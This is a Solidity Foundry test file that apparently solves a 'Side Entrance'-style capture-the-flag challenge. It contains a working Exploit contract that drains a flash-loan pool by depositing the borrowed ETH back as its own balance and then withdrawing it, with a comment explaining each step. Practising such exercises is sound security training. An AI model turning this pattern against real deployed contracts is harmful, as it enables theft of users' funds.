// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "test/Utils/Utilities.sol";
import "forge-std/Test.sol";

import {Lender} from "src/Lender.sol";

contract LenderTest is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    Lender internal lenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        lenderPool = new Lender();
        vm.label(address(lenderPool), "Side Entrance Lender Pool");

        vm.deal(address(lenderPool), ETHER_IN_POOL);

        assertEq(address(lenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    // you must not touch anything in setup,
    // you must not prank the owner address or the Lender Contract it self.
    // focus on adding your logic to the EXPLOIT START and EXPLOIT END markers
    // you can create a contract if you need to. GOODLUCK!!!
    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.prank(attacker);
        Exploit exploit = new Exploit(lenderPool);

        vm.prank(attacker);
        exploit.run(ETHER_IN_POOL);
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(lenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

import {IFlashLoanEtherReceiver} from "src/Lender.sol";

contract Exploit is IFlashLoanEtherReceiver {
    Lender lender;

    constructor(Lender _lender) {
        lender = _lender;
    }

    function run(uint256 amount) external {
        lender.flashLoan(amount);
        lender.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable override {
        lender.deposit{value: msg.value}();
    }

    receive() external payable {}
}


/**
 The Exploit contract is designed to trick the Lender pool into thinking the flash loan was repaid, while actually converting those funds into a
 withdrawable deposit. Here is the step-by-step breakdown of its purpose:

   1. Interface Compliance: 
    It implements IFlashLoanEtherReceiver so that the Lender contract can successfully call the execute() function during the flash loan.
   2. The "Repayment" Trick:
    When lender.flashLoan is called, it sends the ETH to the Exploit contract and then calls its execute() function. Inside execute(), the contract immediately calls lender.deposit{value: msg.value}(). 
       * From the Pool's perspective: The ETH has been "returned" to its balance, so the flashLoan check
         (address(this).balance >= balanceBefore) passes.
       * From the Accounting perspective: The pool records that the
         Exploit contract now has a personal balance of 1,000 ETH.
   3. Extraction:
    Once the flashLoan function finishes, the Exploit contract calls lender.withdraw(). The pool see that the contract has a 1,000 ETH balance (from the
    deposit in step 2) and sends the ETH back to the Exploit contract.
   4. Delivery:
    Finally, the Exploit contract transfers the stolen ETH to the attacker's address to satisfy the test's validation requirements.
 */